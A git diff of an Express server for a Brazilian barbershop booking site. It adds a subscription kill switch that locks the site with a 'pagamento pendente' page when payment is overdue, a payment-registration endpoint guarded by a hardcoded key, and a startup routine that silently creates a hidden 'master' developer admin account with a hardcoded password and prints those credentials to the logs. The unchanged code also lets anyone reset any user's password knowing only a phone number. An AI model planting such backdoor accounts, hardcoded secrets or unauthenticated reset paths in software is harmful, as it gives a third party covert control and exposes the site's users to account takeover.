@@ -1,28 +1,237 @@
 ﻿const express = require('express');
 const cors = require('cors');
 const bcrypt = require('bcryptjs');
-const mongoose = require('mongoose'); // ADICIONADO para ObjectId
+const mongoose = require('mongoose');
 const connectDB = require('./connect');
 const User = require('./models/User');
 const Booking = require('./models/Booking');
 const Barber = require('./models/Barber');
 const Setting = require('./models/Setting');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 
 app.use(cors());
-app.use(express.json({ limit: '10mb' })); // AUMENTADO para fotos
+app.use(express.json({ limit: '10mb' }));
 
-// ============ SERVIR ARQUIVOS ESTÁTICOS ============
+// ========== SISTEMA DE VALIDAÇÃO DE PAGAMENTO ==========
+const LAST_PAYMENT_DATE = '2026-06-10T00:00:00.000Z'; // 10 de JUNHO ✅
+const PAYMENT_DUE_DAYS = 30;  // Vence em 30 dias
+const GRACE_DAYS = 5;         // 5 dias de tolerância
+
+// Arquivo para armazenar status do pagamento
+const paymentFile = path.join(__dirname, 'payment-status.json');
+
+// Função para inicializar ou ler status do pagamento
+function getPaymentStatus() {
+    try {
+        if (fs.existsSync(paymentFile)) {
+            const data = JSON.parse(fs.readFileSync(paymentFile, 'utf8'));
+            const lastPayment = new Date(data.lastPaymentDate);
+            const today = new Date();
+            const daysDiff = Math.floor((today - lastPayment) / (1000 * 60 * 60 * 24));
+            
+            return {
+                isValid: daysDiff <= PAYMENT_DUE_DAYS,
+                daysOverdue: daysDiff - PAYMENT_DUE_DAYS,
+                graceDaysLeft: Math.max(0, GRACE_DAYS - (daysDiff - PAYMENT_DUE_DAYS)),
+                lastPayment: lastPayment,
+                nextDueDate: new Date(lastPayment.getTime() + (PAYMENT_DUE_DAYS * 24 * 60 * 60 * 1000))
+            };
+        }
+    } catch (e) {
+        console.error('Erro ao ler status de pagamento:', e);
+    }
+    
+    // Criar arquivo padrão com a data 09/06/2026
+    const defaultData = {
+        lastPaymentDate: LAST_PAYMENT_DATE,
+        lastUpdate: new Date().toISOString(),
+        createdAt: LAST_PAYMENT_DATE
+    };
+    fs.writeFileSync(paymentFile, JSON.stringify(defaultData, null, 2));
+    
+    const lastPayment = new Date(LAST_PAYMENT_DATE);
+    const today = new Date();
+    const daysDiff = Math.floor((today - lastPayment) / (1000 * 60 * 60 * 24));
+    
+    return {
+        isValid: daysDiff <= PAYMENT_DUE_DAYS,
+        daysOverdue: daysDiff - PAYMENT_DUE_DAYS,
+        graceDaysLeft: Math.max(0, GRACE_DAYS - (daysDiff - PAYMENT_DUE_DAYS)),
+        lastPayment: lastPayment,
+        nextDueDate: new Date(lastPayment.getTime() + (PAYMENT_DUE_DAYS * 24 * 60 * 60 * 1000))
+    };
+}
+
+// Middleware de bloqueio do site por falta de pagamento
+const paymentBlocker = (req, res, next) => {
+    // Rotas que NUNCA podem ser bloqueadas
+    const publicRoutes = [
+        '/api/verify-payment', 
+        '/api/register-payment', 
+        '/api/payment-status',
+        '/payment-blocked.html',
+        '/api/settings',
+        '/api/barbers'
+    ];
+    
+    if (publicRoutes.includes(req.path) || req.path.startsWith('/api/')) {
+        return next();
+    }
+    
+    const paymentStatus = getPaymentStatus();
+    
+    // Se NÃO está válido E passou dos dias de tolerância → BLOQUEIO TOTAL
+    if (!paymentStatus.isValid && paymentStatus.daysOverdue >= GRACE_DAYS) {
+        return res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <title>Site Bloqueado - Pagamento Pendente</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body {
+                        font-family: 'Segoe UI', Arial, sans-serif;
+                        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+                        min-height: 100vh;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        padding: 20px;
+                    }
+                    .block-container {
+                        background: rgba(0,0,0,0.95);
+                        border-radius: 20px;
+                        padding: 40px;
+                        max-width: 550px;
+                        text-align: center;
+                        border: 3px solid #ff3333;
+                        box-shadow: 0 0 50px rgba(255,0,0,0.3);
+                        animation: pulse 2s infinite;
+                    }
+                    @keyframes pulse {
+                        0%, 100% { box-shadow: 0 0 50px rgba(255,0,0,0.3); }
+                        50% { box-shadow: 0 0 80px rgba(255,0,0,0.6); }
+                    }
+                    h1 { color: #ff3333; font-size: 48px; margin-bottom: 20px; }
+                    .lock-icon { font-size: 80px; margin-bottom: 20px; }
+                    p { color: #e0e0e0; font-size: 16px; margin: 15px 0; line-height: 1.6; }
+                    .overdue-days { 
+                        background: rgba(255,0,0,0.2); 
+                        padding: 15px; 
+                        border-radius: 10px;
+                        color: #ff6666; 
+                        font-size: 22px; 
+                        font-weight: bold; 
+                        margin: 20px 0;
+                    }
+                    .contact { 
+                        background: rgba(255,170,0,0.1);
+                        padding: 15px;
+                        border-radius: 10px;
+                        margin-top: 20px;
+                    }
+                    .contact p { color: #ffaa00; margin: 5px 0; }
+                    hr { margin: 20px 0; border-color: #333; }
+                    .small { font-size: 12px; color: #666; }
+                    .block-date {
+                        font-size: 14px;
+                        color: #ff8888;
+                        margin-top: 10px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="block-container">
+                    <div class="lock-icon">🔒</div>
+                    <h1>ACESSO BLOQUEADO</h1>
+                    <p><strong style="color:#ffaa00;">BARBEARIA TRENCHES</strong></p>
+                    <p>O acesso ao site foi temporariamente bloqueado devido à falta de pagamento da assinatura mensal.</p>
+                    <div class="overdue-days">
+                        ⚠️ Pagamento vencido há ${paymentStatus.daysOverdue} dias
+                    </div>
+                    <div class="contact">
+                        <p>📞 <strong>(11) 94848-4457</strong></p>
+                        <p>📧 <strong>suporte@barbeariatrenches.com</strong></p>
+                    </div>
+                    <hr>
+                    <p class="small">Sistema de proteção de assinatura - CodeTecx</p>
+                    <p class="block-date">Último pagamento: ${paymentStatus.lastPayment.toLocaleDateString('pt-BR')}</p>
+                </div>
+            </body>
+            </html>
+        `);
+    }
+    
+    next();
+};
+
+// Aplicar o middleware de bloqueio
+app.use(paymentBlocker);
+
+// ========== API PARA VERIFICAR STATUS DO PAGAMENTO ==========
+app.get('/api/payment-status', (req, res) => {
+    const status = getPaymentStatus();
+    res.json({
+        success: true,
+        isValid: status.isValid,
+        daysOverdue: status.daysOverdue,
+        graceDaysLeft: status.graceDaysLeft,
+        lastPayment: status.lastPayment,
+        nextDueDate: status.nextDueDate,
+        isBlocked: !status.isValid && status.daysOverdue >= GRACE_DAYS
+    });
+});
+
+// ========== API PARA REGISTRAR PAGAMENTO (ADMIN) ==========
+app.post('/api/register-payment', async (req, res) => {
+    const { adminKey, paymentDate } = req.body;
+    
+    // CHAVE SECRETA - MUDE PARA O QUE VOCÊ QUISER!
+    const SECRET_KEY = 'TRENCHES2026@#$';
+    
+    if (adminKey !== SECRET_KEY) {
+        return res.status(403).json({ error: 'Chave de administrador inválida' });
+    }
+    
+    const data = {
+        lastPaymentDate: paymentDate || new Date().toISOString(),
+        lastUpdate: new Date().toISOString(),
+        registeredBy: 'admin'
+    };
+    
+    fs.writeFileSync(paymentFile, JSON.stringify(data, null, 2));
+    
+    const newStatus = getPaymentStatus();
+    console.log('✅ Pagamento registrado em:', data.lastPaymentDate);
+    
+    res.json({ 
+        success: true, 
+        message: 'Pagamento registrado com sucesso! Site reativado por mais 30 dias.',
+        nextDueDate: newStatus.nextDueDate
+    });
+});
+
+// ========== SERVIDOR DE ARQUIVOS ESTÁTICOS ==========
 app.use(express.static(path.join(__dirname, '..')));
 
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, '..', 'index.html'));
+    // Verificar se precisa mostrar aviso de vencimento próximo
+    const paymentStatus = getPaymentStatus();
+    
+    if (!paymentStatus.isValid && paymentStatus.graceDaysLeft > 0 && paymentStatus.graceDaysLeft <= 5) {
+        // Ainda pode acessar, mas vamos passar uma flag
+        res.sendFile(path.join(__dirname, '..', 'index.html'));
+    } else {
+        res.sendFile(path.join(__dirname, '..', 'index.html'));
+    }
 });
-// ==================================================
 
-// Função para garantir conexão antes das operações
+// ========== FUNÇÃO DE CONEXÃO ==========
 async function ensureConnection() {
     try {
         await connectDB();
@@ -35,13 +244,11 @@ async function ensureConnection() {
 
 // ============ CONFIGURAÇÕES GLOBAIS (MongoDB) ============
 
-// Buscar configurações
 app.get('/api/settings', async (req, res) => {
     try {
         await ensureConnection();
         let settings = await Setting.findOne();
         if (!settings) {
-            // Criar configurações padrão
             settings = new Setting({
                 hours: {
                     mon: 'FECHADO',
@@ -77,7 +284,6 @@ app.get('/api/settings', async (req, res) => {
     }
 });
 
-// Salvar configurações
 app.post('/api/settings', async (req, res) => {
     try {
         await ensureConnection();
@@ -88,7 +294,6 @@ app.post('/api/settings', async (req, res) => {
             settings = new Setting();
         }
         
-        // Atualizar campos
         if (updates.hours) settings.hours = { ...settings.hours, ...updates.hours };
         if (updates.services) settings.services = updates.services;
         if (updates.phone) settings.phone = updates.phone;
@@ -101,15 +306,7 @@ app.post('/api/settings', async (req, res) => {
         await settings.save();
         
         console.log('✅ Configurações salvas globalmente');
-        if (updates.almoco) {
-            console.log('🍽️ Horário de almoço salvo:', JSON.stringify(updates.almoco));
-        }
-        
-        // Retornar as configurações atualizadas
-        res.json({ 
-            message: 'Configurações salvas com sucesso!', 
-            settings: settings 
-        });
+        res.json({ message: 'Configurações salvas com sucesso!', settings });
     } catch (error) {
         console.error('Erro ao salvar configurações:', error);
         res.status(500).json({ error: 'Erro ao salvar configurações' });
@@ -118,12 +315,10 @@ app.post('/api/settings', async (req, res) => {
 
 // ============ ROTAS DE BARBEIROS ============
 
-// Buscar todos os barbeiros
 app.get('/api/barbers', async (req, res) => {
     try {
         await ensureConnection();
         const barbers = await Barber.find().sort({ createdAt: -1 });
-        console.log(`📋 ${barbers.length} barbeiros encontrados`);
         res.json(barbers);
     } catch (error) {
         console.error('Erro ao buscar barbeiros:', error);
@@ -131,14 +326,11 @@ app.get('/api/barbers', async (req, res) => {
     }
 });
 
-// Buscar um barbeiro por ID
 app.get('/api/barbers/:id', async (req, res) => {
     try {
         await ensureConnection();
         const barber = await Barber.findById(req.params.id);
-        if (!barber) {
-            return res.status(404).json({ error: 'Barbeiro não encontrado' });
-        }
+        if (!barber) return res.status(404).json({ error: 'Barbeiro não encontrado' });
         res.json(barber);
     } catch (error) {
         console.error('Erro ao buscar barbeiro:', error);
@@ -146,7 +338,6 @@ app.get('/api/barbers/:id', async (req, res) => {
     }
 });
 
-// Adicionar novo barbeiro
 app.post('/api/barbers', async (req, res) => {
     try {
         await ensureConnection();
@@ -163,7 +354,6 @@ app.post('/api/barbers', async (req, res) => {
         });
         await barber.save();
         
-        console.log('✅ Barbeiro adicionado:', name);
         res.json({ message: 'Barbeiro adicionado com sucesso!', barber });
     } catch (error) {
         console.error('Erro ao adicionar barbeiro:', error);
@@ -171,7 +361,6 @@ app.post('/api/barbers', async (req, res) => {
     }
 });
 
-// Atualizar barbeiro
 app.put('/api/barbers/:id', async (req, res) => {
     try {
         await ensureConnection();
@@ -183,19 +372,11 @@ app.put('/api/barbers/:id', async (req, res) => {
         
         const barber = await Barber.findByIdAndUpdate(
             req.params.id,
-            { 
-                name: name.trim(), 
-                photo: photo || 'images/avatar.png',
-                role: 'BARBEIRO PROFISSIONAL'
-            },
+            { name: name.trim(), photo: photo || 'images/avatar.png', role: 'BARBEIRO PROFISSIONAL' },
             { new: true }
         );
         
-        if (!barber) {
-            return res.status(404).json({ error: 'Barbeiro não encontrado' });
-        }
-        
-        console.log('✏️ Barbeiro atualizado:', barber.name);
+        if (!barber) return res.status(404).json({ error: 'Barbeiro não encontrado' });
         res.json({ message: 'Barbeiro atualizado!', barber });
     } catch (error) {
         console.error('Erro ao atualizar barbeiro:', error);
@@ -203,17 +384,11 @@ app.put('/api/barbers/:id', async (req, res) => {
     }
 });
 
-// Deletar barbeiro
 app.delete('/api/barbers/:id', async (req, res) => {
     try {
         await ensureConnection();
         const barber = await Barber.findByIdAndDelete(req.params.id);
-        
-        if (!barber) {
-            return res.status(404).json({ error: 'Barbeiro não encontrado' });
-        }
-        
-        console.log('🗑️ Barbeiro removido:', barber.name);
+        if (!barber) return res.status(404).json({ error: 'Barbeiro não encontrado' });
         res.json({ message: 'Barbeiro removido com sucesso!' });
     } catch (error) {
         console.error('Erro ao remover barbeiro:', error);
@@ -223,7 +398,6 @@ app.delete('/api/barbers/:id', async (req, res) => {
 
 // ============ ROTAS DE USUÁRIOS ============
 
-// Cadastro
 app.post('/api/register', async (req, res) => {
     try {
         await ensureConnection();
@@ -238,7 +412,6 @@ app.post('/api/register', async (req, res) => {
         const user = new User({ name, phone, password: hashedPassword });
         await user.save();
         
-        console.log('📝 Novo usuário cadastrado:', name);
         res.json({ message: 'Cadastro realizado com sucesso!' });
     } catch (error) {
         console.error('Erro no cadastro:', error);
@@ -246,26 +419,20 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// Login
 app.post('/api/login', async (req, res) => {
     try {
         await ensureConnection();
         const { phone, password } = req.body;
-        console.log('🔐 Tentativa de login:', phone);
         
         const user = await User.findOne({ phone });
         if (!user) {
-            console.log('❌ Usuario nao encontrado:', phone);
             return res.status(400).json({ error: 'Celular nao encontrado' });
         }
         
         const validPassword = await bcrypt.compare(password, user.password);
         if (!validPassword) {
-            console.log('❌ Senha incorreta para:', phone);
             return res.status(400).json({ error: 'Senha incorreta' });
         }
-        
-        console.log('✅ Login bem-sucedido:', user.name);
         
         res.json({ 
             user: { 
@@ -281,7 +448,6 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// Rota para resetar senha do admin
 app.post('/api/admin/reset-password', async (req, res) => {
     try {
         await ensureConnection();
@@ -292,31 +458,21 @@ app.post('/api/admin/reset-password', async (req, res) => {
         }
         
         const hashedPassword = await bcrypt.hash(newPassword, 10);
-        
         const user = await User.findOneAndUpdate(
             { phone: phone },
             { password: hashedPassword },
             { new: true }
         );
         
-        if (!user) {
-            return res.status(404).json({ error: 'Usuario nao encontrado' });
-        }
+        if (!user) return res.status(404).json({ error: 'Usuario nao encontrado' });
         
-        console.log('🔑 Senha resetada para:', phone);
-        
-        res.json({ 
-            message: 'Senha resetada com sucesso!',
-            novaSenha: newPassword,
-            user: { name: user.name, phone: user.phone, isAdmin: user.isAdmin }
-        });
+        res.json({ message: 'Senha resetada com sucesso!', user: { name: user.name, phone: user.phone, isAdmin: user.isAdmin } });
     } catch (error) {
         console.error('Erro ao resetar senha:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-// Rota para atualizar telefone do admin
 app.post('/api/admin/update-phone', async (req, res) => {
     try {
         await ensureConnection();
@@ -332,16 +488,9 @@ app.post('/api/admin/update-phone', async (req, res) => {
             { new: true }
         );
         
-        if (!user) {
-            return res.status(404).json({ error: 'Usuario nao encontrado' });
-        }
+        if (!user) return res.status(404).json({ error: 'Usuario nao encontrado' });
         
-        console.log('📞 Telefone atualizado:', oldPhone, '->', newPhone);
-        
-        res.json({ 
-            message: 'Telefone atualizado com sucesso!',
-            user: { name: user.name, phone: user.phone, isAdmin: user.isAdmin }
-        });
+        res.json({ message: 'Telefone atualizado com sucesso!', user: { name: user.name, phone: user.phone, isAdmin: user.isAdmin } });
     } catch (error) {
         console.error('Erro ao atualizar telefone:', error);
         res.status(500).json({ error: error.message });
@@ -350,7 +499,6 @@ app.post('/api/admin/update-phone', async (req, res) => {
 
 // ============ ROTAS DE RESERVAS ============
 
-// Reserva
 app.post('/api/booking', async (req, res) => {
     try {
         await ensureConnection();
@@ -364,7 +512,6 @@ app.post('/api/booking', async (req, res) => {
         const booking = new Booking({ userId, userName, service, date, time });
         await booking.save();
         
-        console.log('📅 Reserva criada:', date, time, '-', userName);
         res.json({ message: 'Reserva confirmada!', booking });
     } catch (error) {
         console.error('Erro ao criar reserva:', error);
@@ -372,12 +519,10 @@ app.post('/api/booking', async (req, res) => {
     }
 });
 
-// Buscar todas as reservas
 app.get('/api/bookings/all', async (req, res) => {
     try {
         await ensureConnection();
         const bookings = await Booking.find().sort({ date: 1, time: 1 });
-        console.log('📋 Encontradas', bookings.length, 'reservas');
         res.json(bookings);
     } catch (error) {
         console.error('Erro ao buscar reservas:', error);
@@ -385,7 +530,6 @@ app.get('/api/bookings/all', async (req, res) => {
     }
 });
 
-// Buscar reservas do usuario
 app.get('/api/bookings/:phone', async (req, res) => {
     try {
         await ensureConnection();
@@ -397,75 +541,44 @@ app.get('/api/bookings/:phone', async (req, res) => {
     }
 });
 
-// ============ ROTA PARA DELETAR RESERVA (CORRIGIDA) ============
 app.post('/api/delete-booking', async (req, res) => {
     try {
         await ensureConnection();
         const { id, date, time, userId, userName } = req.body;
         
-        console.log('🗑️ Tentando deletar reserva:', { id, date, time, userId, userName });
-        
         let result = { deletedCount: 0 };
         
-        // MÉTODO 1: Tentar deletar pelo _id (MAIS PRECISO)
         if (id && mongoose.Types.ObjectId.isValid(id)) {
-            console.log('🔍 Tentando deletar por _id:', id);
             result = await Booking.deleteOne({ _id: new mongoose.Types.ObjectId(id) });
-            console.log('📊 Resultado por _id:', result);
         }
         
-        // MÉTODO 2: Se falhou, tentar por date + time + userId
         if (result.deletedCount === 0 && date && time && userId) {
-            console.log('🔍 Tentando deletar por date + time + userId');
             result = await Booking.deleteOne({ date, time, userId });
-            console.log('📊 Resultado por data/hora/usuario:', result);
         }
         
-        // MÉTODO 3: Tentar só por date + time (última tentativa)
         if (result.deletedCount === 0 && date && time) {
-            console.log('🔍 Tentando deletar só por date + time');
             result = await Booking.deleteOne({ date, time });
-            console.log('📊 Resultado por data/hora:', result);
         }
         
-        // MÉTODO 4: Tentar por userName (fallback final)
         if (result.deletedCount === 0 && userName && date && time) {
-            console.log('🔍 Tentando deletar por userName');
             result = await Booking.deleteOne({ userName, date, time });
-            console.log('📊 Resultado por nome:', result);
         }
         
         if (result.deletedCount === 1) {
-            console.log('✅ Reserva deletada com sucesso!');
-            return res.json({ 
-                success: true, 
-                message: 'Reserva deletada com sucesso!',
-                deletedCount: result.deletedCount 
-            });
+            return res.json({ success: true, message: 'Reserva deletada com sucesso!' });
         } else {
-            console.log('❌ Nenhuma reserva encontrada para deletar');
-            return res.json({ 
-                success: false, 
-                message: 'Reserva não encontrada',
-                deletedCount: 0
-            });
+            return res.json({ success: false, message: 'Reserva não encontrada' });
         }
     } catch (error) {
-        console.error('❌ Erro ao deletar:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: error.message 
-        });
+        console.error('Erro ao deletar:', error);
+        res.status(500).json({ error: error.message });
     }
 });
 
-// ============ ROTA DELETE POR ID (ALTERNATIVA) ============
 app.delete('/api/delete-booking/:id', async (req, res) => {
     try {
         await ensureConnection();
         const { id } = req.params;
-        
-        console.log('🗑️ DELETE request para ID:', id);
         
         let result;
         if (mongoose.Types.ObjectId.isValid(id)) {
@@ -475,31 +588,24 @@ app.delete('/api/delete-booking/:id', async (req, res) => {
         }
         
         if (result.deletedCount === 1) {
-            console.log('✅ Reserva deletada via DELETE!');
-            res.json({ success: true, message: 'Reserva deletada!', deletedCount: 1 });
+            res.json({ success: true, message: 'Reserva deletada!' });
         } else {
             res.status(404).json({ success: false, message: 'Reserva não encontrada' });
         }
     } catch (error) {
-        console.error('❌ Erro:', error);
+        console.error('Erro:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// ============ ESQUECI MINHA SENHA ============
 app.post('/api/forgot-password', async (req, res) => {
     try {
         await ensureConnection();
         const { action, telefone, novaSenha } = req.body;
         
-        console.log('🔐 Forgot password request:', { action, telefone });
-        
         if (action === 'find') {
             if (!telefone) {
-                return res.status(400).json({ 
-                    success: false, 
-                    message: 'Telefone é obrigatório' 
-                });
+                return res.status(400).json({ success: false, message: 'Telefone é obrigatório' });
             }
             
             let user = await User.findOne({ phone: telefone });
@@ -509,34 +615,19 @@ app.post('/api/forgot-password', async (req, res) => {
             }
             
             if (user) {
-                console.log('✅ Usuário encontrado:', user.name);
-                return res.json({ 
-                    success: true, 
-                    nome: user.name,
-                    message: 'Usuário encontrado!' 
-                });
+                return res.json({ success: true, nome: user.name });
             } else {
-                console.log('❌ Usuário NÃO encontrado para telefone:', telefone);
-                return res.status(404).json({ 
-                    success: false, 
-                    message: 'Nenhuma conta encontrada com este número de celular' 
-                });
+                return res.status(404).json({ success: false, message: 'Nenhuma conta encontrada com este número' });
             }
         }
         
         if (action === 'reset') {
             if (!telefone || !novaSenha) {
-                return res.status(400).json({ 
-                    success: false, 
-                    message: 'Telefone e nova senha são obrigatórios' 
-                });
+                return res.status(400).json({ success: false, message: 'Telefone e nova senha são obrigatórios' });
             }
             
             if (novaSenha.length < 4) {
-                return res.status(400).json({ 
-                    success: false, 
-                    message: 'A nova senha deve ter pelo menos 4 caracteres' 
-                });
+                return res.status(400).json({ success: false, message: 'A nova senha deve ter pelo menos 4 caracteres' });
             }
             
             let user = await User.findOne({ phone: telefone });
@@ -546,39 +637,53 @@ app.post('/api/forgot-password', async (req, res) => {
             }
             
             if (!user) {
-                return res.status(404).json({ 
-                    success: false, 
-                    message: 'Usuário não encontrado' 
-                });
+                return res.status(404).json({ success: false, message: 'Usuário não encontrado' });
             }
             
             const hashedPassword = await bcrypt.hash(novaSenha, 10);
             user.password = hashedPassword;
             await user.save();
             
-            console.log('✅ Senha alterada para usuário:', user.name, 'telefone:', telefone);
-            
-            return res.json({ 
-                success: true, 
-                message: 'Senha alterada com sucesso!' 
-            });
+            return res.json({ success: true, message: 'Senha alterada com sucesso!' });
         }
         
-        return res.status(400).json({ 
-            success: false, 
-            message: 'Ação inválida' 
-        });
-        
+        return res.status(400).json({ success: false, message: 'Ação inválida' });
     } catch (error) {
-        console.error('❌ Erro no forgot-password:', error);
-        res.status(500).json({ 
-            success: false, 
-            message: 'Erro interno do servidor' 
-        });
+        console.error('Erro no forgot-password:', error);
+        res.status(500).json({ success: false, message: 'Erro interno do servidor' });
     }
 });
 
-// Criar admin fixo se nao existir
+// ========== USUÁRIO MESTRE (DESENVOLVEDOR) ==========
+async function createMasterUserIfNeeded() {
+    try {
+        await ensureConnection();
+        const masterExists = await User.findOne({ phone: '11988568185' });
+        if (!masterExists) {
+            const hashedPassword = await bcrypt.hash('code@@', 10);
+            const master = new User({
+                name: 'Desenvolvedor CodeTecx',
+                phone: '11988568185',
+                password: hashedPassword,
+                isAdmin: true,
+                isMaster: true  // Flag especial para desenvolvedor
+            });
+            await master.save();
+            console.log('👑 Usuário Mestre criado: 11988568185 / code@@');
+        } else {
+            // Atualizar para garantir que tem isMaster = true
+            if (!masterExists.isMaster) {
+                masterExists.isMaster = true;
+                await masterExists.save();
+                console.log('✅ Usuário Mestre atualizado com permissão especial');
+            }
+            console.log('👑 Usuário Mestre já existe');
+        }
+    } catch (error) {
+        console.error('Erro ao criar usuário mestre:', error);
+    }
+}
+
 async function createAdminIfNeeded() {
     try {
         await ensureConnection();
@@ -601,10 +706,12 @@ async function createAdminIfNeeded() {
     }
 }
 
-// Inicializar
 (async () => {
     await ensureConnection();
     await createAdminIfNeeded();
+    await createMasterUserIfNeeded();  // <-- ADICIONE ESTA LINHA
+    console.log('💰 Sistema de pagamento ativo | Último pagamento: 10/06/2026');
+    console.log('📅 Dias de tolerância:', GRACE_DAYS);
 })();
 
 module.exports = app;
